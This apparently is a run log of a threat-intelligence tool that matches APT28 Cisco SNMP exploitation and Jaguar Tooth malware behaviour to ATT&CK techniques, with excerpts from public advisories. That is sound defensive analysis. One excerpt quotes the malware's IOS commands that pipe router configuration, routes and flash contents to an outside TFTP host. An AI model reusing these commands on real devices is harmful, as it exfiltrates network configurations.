[2025-03-27 12:04:18,567 INFO] Application started with interaction level: LOW (0.000000)
[2025-03-27 12:04:18,567 INFO] Starting time: 2025-03-27 12:04:18
[2025-03-27 12:04:18,942 INFO] Documents loaded: 173
[2025-03-27 12:04:37,177 INFO] Extracted 7 IOCs from the STIX file
[2025-03-27 12:04:37,177 INFO] Inserted state with id: 62aef466-736c-4640-86d3-82d8a8029b37
[2025-03-27 12:04:38,561 INFO] Processing step relative to tactic: initial-access
[2025-03-27 12:04:38,561 INFO] + Processing action: Exploit Public-Facing Application as used by the malware
[2025-03-27 12:04:41,846 INFO] ++ Embedding computed for: Exploit Public-Facing Application as used by the malware. The vector has shape: (384,)
[2025-03-27 12:04:41,864 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [content injection]: tensor([[0.4178]])
[2025-03-27 12:04:41,875 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [drive-by compromise]: tensor([[0.3854]])
[2025-03-27 12:04:41,893 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [exploit public-facing application]: tensor([[0.5846]])
[2025-03-27 12:04:41,904 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [external remote services]: tensor([[0.2744]])
[2025-03-27 12:04:41,915 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [hardware additions]: tensor([[0.3240]])
[2025-03-27 12:04:41,927 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [phishing]: tensor([[0.2383]])
[2025-03-27 12:04:41,941 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [phishing: spearphishing attachment]: tensor([[0.2643]])
[2025-03-27 12:04:41,952 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [phishing: spearphishing link]: tensor([[0.2353]])
[2025-03-27 12:04:41,962 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [phishing: spearphishing via service]: tensor([[0.2017]])
[2025-03-27 12:04:41,974 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [phishing: spearphishing voice]: tensor([[0.2059]])
[2025-03-27 12:04:41,987 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [replication through removable media]: tensor([[0.3335]])
[2025-03-27 12:04:42,004 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [supply chain compromise]: tensor([[0.1613]])
[2025-03-27 12:04:42,014 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [supply chain compromise: compromise software dependencies and development tools]: tensor([[0.3002]])
[2025-03-27 12:04:42,025 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [supply chain compromise: compromise software supply chain]: tensor([[0.2707]])
[2025-03-27 12:04:42,039 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [supply chain compromise: compromise hardware supply chain]: tensor([[0.3072]])
[2025-03-27 12:04:42,051 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [trusted relationship]: tensor([[0.2686]])
[2025-03-27 12:04:42,067 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [valid accounts]: tensor([[0.3153]])
[2025-03-27 12:04:42,080 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [valid accounts: default accounts]: tensor([[0.1913]])
[2025-03-27 12:04:42,093 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [valid accounts: domain accounts]: tensor([[0.1704]])
[2025-03-27 12:04:42,104 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [valid accounts: local accounts]: tensor([[0.2805]])
[2025-03-27 12:04:42,115 INFO] ++ Similarity between [Exploit Public-Facing Application as used by the malware] and [valid accounts: cloud accounts]: tensor([[0.1303]])
[2025-03-27 12:04:42,116 INFO] ++ Scores: [('exploit public-facing application', tensor([[0.5846]])), ('content injection', tensor([[0.4178]])), ('drive-by compromise', tensor([[0.3854]])), ('replication through removable media', tensor([[0.3335]])), ('hardware additions', tensor([[0.3240]]))]
[2025-03-27 12:04:42,116 INFO] ++ Similar techniques found:
['exploit public-facing application', 'content injection', 'drive-by compromise', 'replication through removable media', 'hardware additions']
[2025-03-27 12:04:42,116 INFO] ++ Querying the QA model for action Exploit Public-Facing Application as used by the malware with the following context:
exploit public-facing application
content injection
drive-by compromise
replication through removable media
hardware additions
[2025-03-27 12:04:47,104 INFO] ++ QA suggested technique: exploit public-facing application
[2025-03-27 12:04:47,104 INFO] ++ Selected technique: exploit public-facing application
[2025-03-27 12:04:51,985 INFO] ++ Refining the action: Exploit Public-Facing Application as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected system via IPv4 or IPv6.\n\nOnly traffic directed to an affected system can be used to exploit these vulnerabilities.\n\nThe vulnerabilities are due to a buffer overflow condition in the SNMP subsystem of the affected software.\n\nThe vulnerabilities affect all versions of SNMP: Versions 1, 2c, and 3.'), Document(id='5a640bf5-7c7f-4f53-a572-697f449bc2cc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='For detailed TTPs , see the M alware Analysis R eport .\n\nTactic  ID Technique  Procedure  \nInitial \nAccess  T1190  Exploit Public -\nfacing \nApplication.\n\nAPT28 exploited \ndefault/well-known \ncommunity strings in \nSNMP as outlined in \nCVE-2017-6742 (Cisco \nBug ID: CSCve54313 ).\n\nInitial \nAccess  T1078.001  Valid Accounts.\n\nDefault Accounts.'), Document(id='259e689e-566c-4ddd-8506-bb496b2fd19a', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='r, command : \n \n• sleep 5000  \n• enable \n• sh run | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ver | r tftp:// [IP ADDRESS] /[URL PAGE] \n• sleep 5000  \n• sh ip int bri | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh arp | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh cdp neig | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh start | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ip ro  | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh fla | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• disable \n• tclquit    \n \nSNMP exploit  \nOverview  \nJaguar Tooth is deployed via exploitation of the patched  SNMP vulnerability  CVE-2017 -6742 .'), Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected system via IPv4 or IPv6.\n\nOnly traffic directed to an affected system can be used to exploit these vulnerabilities.The vulnerabilities are due to a buffer overflow condition in the SNMP subsystem of the affected software.\n\nThe vulnerabilities affect all versions of SNMP - Versions 1, 2c, and 3.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected device via IPv4 or IPv6.\n\nOnly traffic directed to the affected system can be used to exploit these vulnerabilities.To exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='You can read their findings and recommendations in theira blog postalso out today.Infrastructure devices are critical components of any organization’s IT infrastructure.\n\nThese devices are often the first line of defense against cyber-attacks and can help prevent unauthorized access to your network.')]
[2025-03-27 12:05:23,919 INFO] ++ Pre-conditions computed for action: Exploit Public-Facing Application as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='The vulnerabilities affect all versions of SNMP: Versions 1, 2c, and 3.\n\nTo exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system.\n\nTo exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.'), Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(id='f0858101-9ec3-4309-965b-ba52ca16747b', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o Enforce a strong password policy .\n\nDon’t reuse the same password for \nmultiple devices.\n\nEach device should have a unique password.\n\nWhere \npossible, avoid legacy password -based authentication and impl ement two -\nfactor authentication based on public -private key.\n\no D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.'), Document(id='986b3c08-ec72-40b9-979a-ab33aab77dfc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.\n\nWhere possible, use modern encrypted protocols such as SSH and SNMP v3.\n\nHarden the encryption protocols based on current best security practice.\n\nThe \nNCSC strongly advise s owners and operators to retire and replace legacy \ndevices that can’t be configured to use SNMP v3.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='The vulnerabilities affect all versions of SNMP - Versions 1, 2c, and 3.\n\nTo exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system.\n\nTo exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nA successful exploit could allow the attacker to execute arbitrary code and obtain full control of the affected system or cause the affected system to reload.Customers are advised to apply the workaround as contained in the Workarounds section below.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected device via IPv4 or IPv6.\n\nOnly traffic directed to the affected system can be used to exploit these vulnerabilities.To exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system.')]
[2025-03-27 12:05:33,870 INFO] ++ Post-conditions computed for action: Exploit Public-Facing Application as used by the malware using 7 documents:
[Document(metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='The vulnerabilities affect all versions of SNMP: Versions 1, 2c, and 3.\n\nTo exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system.\n\nTo exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.'), Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(id='986b3c08-ec72-40b9-979a-ab33aab77dfc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.\n\nWhere possible, use modern encrypted protocols such as SSH and SNMP v3.\n\nHarden the encryption protocols based on current best security practice.\n\nThe \nNCSC strongly advise s owners and operators to retire and replace legacy \ndevices that can’t be configured to use SNMP v3.'), Document(id='f0858101-9ec3-4309-965b-ba52ca16747b', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o Enforce a strong password policy .\n\nDon’t reuse the same password for \nmultiple devices.\n\nEach device should have a unique password.\n\nWhere \npossible, avoid legacy password -based authentication and impl ement two -\nfactor authentication based on public -private key.\n\no D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='The vulnerabilities affect all versions of SNMP - Versions 1, 2c, and 3.\n\nTo exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system.\n\nTo exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nA successful exploit could allow the attacker to execute arbitrary code and obtain full control of the affected system or cause the affected system to reload.Customers are advised to apply the workaround as contained in the Workarounds section below.'), Document(metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected system via IPv4 or IPv6.\n\nOnly traffic directed to an affected system can be used to exploit these vulnerabilities.\n\nThe vulnerabilities are due to a buffer overflow condition in the SNMP subsystem of the affected software.\n\nThe vulnerabilities affect all versions of SNMP: Versions 1, 2c, and 3.')]
[2025-03-27 12:05:36,242 INFO] ++ Indicators computed for action: Exploit Public-Facing Application as used by the malware. The indicators are:
['A malicious actor attempts to exploit a public-facing application.']
[2025-03-27 12:05:36,377 INFO] ++ Removed pre-condition: 
The malware capable of exploiting the identified vulnerability.
, due to similarity with: 
The malware utilizes an exploit targeting the specific vulnerability in the application.
 (tensor([[0.7819]]))
[2025-03-27 12:05:46,369 INFO] Processing step relative to tactic: defense-evasion
[2025-03-27 12:05:46,369 INFO] + Processing action: Modify Authentication Process as used by the malware
[2025-03-27 12:05:47,906 INFO] ++ Embedding computed for: Modify Authentication Process as used by the malware. The vector has shape: (384,)
[2025-03-27 12:05:47,925 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [abuse elevation control mechanism]: tensor([[0.3978]])
[2025-03-27 12:05:47,941 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [abuse elevation control mechanism: setuid and setgid]: tensor([[0.3682]])
[2025-03-27 12:05:47,955 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [abuse elevation control mechanism: bypass user account control]: tensor([[0.4625]])
[2025-03-27 12:05:47,982 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [abuse elevation control mechanism: sudo and sudo caching]: tensor([[0.3920]])
[2025-03-27 12:05:47,997 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [abuse elevation control mechanism: elevated execution with prompt]: tensor([[0.4728]])
[2025-03-27 12:05:48,008 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [abuse elevation control mechanism: temporary elevated cloud access]: tensor([[0.3575]])
[2025-03-27 12:05:48,022 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [abuse elevation control mechanism: tcc manipulation]: tensor([[0.4340]])
[2025-03-27 12:05:48,033 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [access token manipulation]: tensor([[0.4705]])
[2025-03-27 12:05:48,046 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [access token manipulation: token impersonation/theft]: tensor([[0.5020]])
[2025-03-27 12:05:48,064 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [access token manipulation: create process with token]: tensor([[0.4611]])
[2025-03-27 12:05:48,075 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [access token manipulation: make and impersonate token]: tensor([[0.5344]])
[2025-03-27 12:05:48,091 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [access token manipulation: parent pid spoofing]: tensor([[0.4631]])
[2025-03-27 12:05:48,107 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [access token manipulation: sid-history injection]: tensor([[0.4433]])
[2025-03-27 12:05:48,121 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [bits jobs]: tensor([[0.2507]])
[2025-03-27 12:05:48,132 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [build image on host]: tensor([[0.2086]])
[2025-03-27 12:05:48,158 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [debugger evasion]: tensor([[0.3445]])
[2025-03-27 12:05:48,172 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [deobfuscate/decode files or information]: tensor([[0.3404]])
[2025-03-27 12:05:48,185 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [deploy container]: tensor([[0.2683]])
[2025-03-27 12:05:48,199 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [direct volume access]: tensor([[0.2348]])
[2025-03-27 12:05:48,212 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [domain or tenant policy modification]: tensor([[0.3376]])
[2025-03-27 12:05:48,226 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [domain or tenant policy modification: group policy modification]: tensor([[0.3070]])
[2025-03-27 12:05:48,241 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [domain or tenant policy modification: trust modification]: tensor([[0.3154]])
[2025-03-27 12:05:48,254 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [execution guardrails]: tensor([[0.3599]])
[2025-03-27 12:05:48,268 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [execution guardrails: environmental keying]: tensor([[0.3564]])
[2025-03-27 12:05:48,280 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [execution guardrails: mutual exclusion]: tensor([[0.4544]])
[2025-03-27 12:05:48,292 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [exploitation for defense evasion]: tensor([[0.4250]])
[2025-03-27 12:05:48,308 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [file and directory permissions modification]: tensor([[0.2612]])
[2025-03-27 12:05:48,324 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [file and directory permissions modification: windows file and directory permissions modification]: tensor([[0.2784]])
[2025-03-27 12:05:48,338 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [file and directory permissions modification: linux and mac file and directory permissions modification]: tensor([[0.2389]])
[2025-03-27 12:05:48,350 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts]: tensor([[0.3538]])
[2025-03-27 12:05:48,366 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: hidden files and directories]: tensor([[0.2283]])
[2025-03-27 12:05:48,385 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: hidden users]: tensor([[0.3800]])
[2025-03-27 12:05:48,398 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: hidden window]: tensor([[0.3438]])
[2025-03-27 12:05:48,413 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: ntfs file attributes]: tensor([[0.1364]])
[2025-03-27 12:05:48,428 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: hidden file system]: tensor([[0.1373]])
[2025-03-27 12:05:48,443 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: run virtual instance]: tensor([[0.3663]])
[2025-03-27 12:05:48,460 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: vba stomping]: tensor([[0.2696]])
[2025-03-27 12:05:48,473 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: email hiding rules]: tensor([[0.1858]])
[2025-03-27 12:05:48,489 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: resource forking]: tensor([[0.2285]])
[2025-03-27 12:05:48,503 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: process argument spoofing]: tensor([[0.3069]])
[2025-03-27 12:05:48,517 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: ignore process interrupts]: tensor([[0.3143]])
[2025-03-27 12:05:48,532 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hide artifacts: file/path exclusions]: tensor([[0.2515]])
[2025-03-27 12:05:48,545 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow]: tensor([[0.4002]])
[2025-03-27 12:05:48,558 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: dll search order hijacking]: tensor([[0.3670]])
[2025-03-27 12:05:48,572 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: dll side-loading]: tensor([[0.2704]])
[2025-03-27 12:05:48,589 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: dylib hijacking]: tensor([[0.2420]])
[2025-03-27 12:05:48,606 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: executable installer file permissions weakness]: tensor([[0.3860]])
[2025-03-27 12:05:48,621 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: dynamic linker hijacking]: tensor([[0.2926]])
[2025-03-27 12:05:48,632 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: path interception by path environment variable]: tensor([[0.3446]])
[2025-03-27 12:05:48,643 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: path interception by search order hijacking]: tensor([[0.3756]])
[2025-03-27 12:05:48,655 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: path interception by unquoted path]: tensor([[0.2942]])
[2025-03-27 12:05:48,671 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: services file permissions weakness]: tensor([[0.4187]])
[2025-03-27 12:05:48,687 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: services registry permissions weakness]: tensor([[0.4404]])
[2025-03-27 12:05:48,705 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: cor_profiler]: tensor([[0.3670]])
[2025-03-27 12:05:48,718 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: kernelcallbacktable]: tensor([[0.4111]])
[2025-03-27 12:05:48,732 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [hijack execution flow: appdomainmanager]: tensor([[0.3151]])
[2025-03-27 12:05:48,744 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses]: tensor([[0.3808]])
[2025-03-27 12:05:48,758 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: disable or modify tools]: tensor([[0.3739]])
[2025-03-27 12:05:48,771 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: disable windows event logging]: tensor([[0.3975]])
[2025-03-27 12:05:48,791 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: impair command history logging]: tensor([[0.3364]])
[2025-03-27 12:05:48,804 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: disable or modify system firewall]: tensor([[0.4445]])
[2025-03-27 12:05:48,818 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: indicator blocking]: tensor([[0.3719]])
[2025-03-27 12:05:48,828 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: disable or modify cloud firewall]: tensor([[0.2864]])
[2025-03-27 12:05:48,840 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: disable or modify cloud logs]: tensor([[0.3074]])
[2025-03-27 12:05:48,853 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: safe mode boot]: tensor([[0.2671]])
[2025-03-27 12:05:48,864 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: downgrade attack]: tensor([[0.3361]])
[2025-03-27 12:05:48,877 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: spoof security alerting]: tensor([[0.3414]])
[2025-03-27 12:05:48,891 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impair defenses: disable or modify linux audit system]: tensor([[0.3897]])
[2025-03-27 12:05:48,907 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [impersonation]: tensor([[0.3011]])
[2025-03-27 12:05:48,921 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal]: tensor([[0.2929]])
[2025-03-27 12:05:48,934 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: clear windows event logs]: tensor([[0.2448]])
[2025-03-27 12:05:48,946 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: clear linux or mac system logs]: tensor([[0.2811]])
[2025-03-27 12:05:48,958 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: clear command history]: tensor([[0.3315]])
[2025-03-27 12:05:48,972 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: file deletion]: tensor([[0.3136]])
[2025-03-27 12:05:48,985 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: network share connection removal]: tensor([[0.3218]])
[2025-03-27 12:05:48,998 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: timestomp]: tensor([[0.2249]])
[2025-03-27 12:05:49,011 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: clear network connection history and configurations]: tensor([[0.3806]])
[2025-03-27 12:05:49,024 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: clear mailbox data]: tensor([[0.1938]])
[2025-03-27 12:05:49,037 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: clear persistence]: tensor([[0.3102]])
[2025-03-27 12:05:49,051 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indicator removal: relocate malware]: tensor([[0.3222]])
[2025-03-27 12:05:49,067 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [indirect command execution]: tensor([[0.2261]])
[2025-03-27 12:05:49,080 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading]: tensor([[0.3137]])
[2025-03-27 12:05:49,094 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: invalid code signature]: tensor([[0.2693]])
[2025-03-27 12:05:49,113 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: right-to-left override]: tensor([[0.2116]])
[2025-03-27 12:05:49,130 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: rename system utilities]: tensor([[0.3454]])
[2025-03-27 12:05:49,143 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: masquerade task or service]: tensor([[0.2585]])
[2025-03-27 12:05:49,160 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: match legitimate name or location]: tensor([[0.2614]])
[2025-03-27 12:05:49,172 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: space after filename]: tensor([[0.1872]])
[2025-03-27 12:05:49,190 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: double file extension]: tensor([[0.0874]])
[2025-03-27 12:05:49,207 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: masquerade file type]: tensor([[0.0989]])
[2025-03-27 12:05:49,222 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: break process trees]: tensor([[0.3721]])
[2025-03-27 12:05:49,235 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [masquerading: masquerade account name]: tensor([[0.2205]])
[2025-03-27 12:05:49,251 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process]: tensor([[0.6129]])
[2025-03-27 12:05:49,262 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: domain controller authentication]: tensor([[0.6288]])
[2025-03-27 12:05:49,274 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: password filter dll]: tensor([[0.6236]])
[2025-03-27 12:05:49,288 INFO] ++ Similarity between [Modify Authentication Process as used by the malware] and [modify authentication process: pluggable authentication modules]: tensor([[0.4911]])
